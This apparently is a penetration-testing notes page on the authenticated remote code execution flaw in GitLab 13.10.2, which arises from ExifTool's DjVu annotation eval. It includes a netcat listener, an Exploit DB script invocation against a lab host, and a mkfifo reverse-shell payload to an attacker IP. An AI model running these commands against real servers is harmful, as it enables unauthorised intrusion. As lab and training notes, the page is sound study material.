---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# 13.10.2 - Remote Code Execution (Authenticated)

When uploading image files, GitLab Workhorse passes any files with the extensions [jpg|jpeg|tiff](https://gitlab.com/gitlab-org/gitlab/-/blob/v13.10.2-ee/workhorse/internal/upload/exif/exif.go#L104) through to [ExifTool](https://exiftool.org/) to remove any non-whitelisted tags. An issue with this is that ExifTool will ignore the file extension and try to determine what the file is based on the content, allowing for any of the supported parsers to be hit instead of just JPEG and TIFF by just renaming the uploaded file.

One of the supported formats is [DjVu](https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm). When parsing the DjVu annotation, the [tokens are evaled](https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm#L233) to "convert C escape sequences". There is some validation to try and ensure that everything is properly escaped, but a backslash followed by a newline is correctly handled allowing the quotes to be closed and arbitrary perl inserted and evaluated.

{% hint style="info" %}
## Official GitLab Report

[https://hackerone.com/reports/1154542](https://hackerone.com/reports/1154542)
{% endhint %}

{% hint style="info" %}
## Exploit DB

[https://www.exploit-db.com/exploits/49951](https://www.exploit-db.com/exploits/49951)
{% endhint %}

## Exploitation

As this is authenticated remote code execution, we first need a valid username and password. In some instances, this would only work if we could obtain valid credentials through OSINT or a credential guessing attack. However, if we encounter a vulnerable version of GitLab that allows for self-registration, we can quickly sign up for an account and pull off the attack.

Start a [netcat.md](../../../../toolbox/tooling/post-exploitation/netcat.md "mention") listener:

{% code title="Command" %}
```bash
nc -lnvp 8443
```
{% endcode %}

Run exploit script from Exploit DB:

{% code title="Command" overflow="wrap" %}
```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u <USER> -p <PASS> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP> 8443 >/tmp/f '
```
{% endcode %}

{% code title="Output" %}
```bash
[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
[+] RCE Triggered !!
```
{% endcode %}
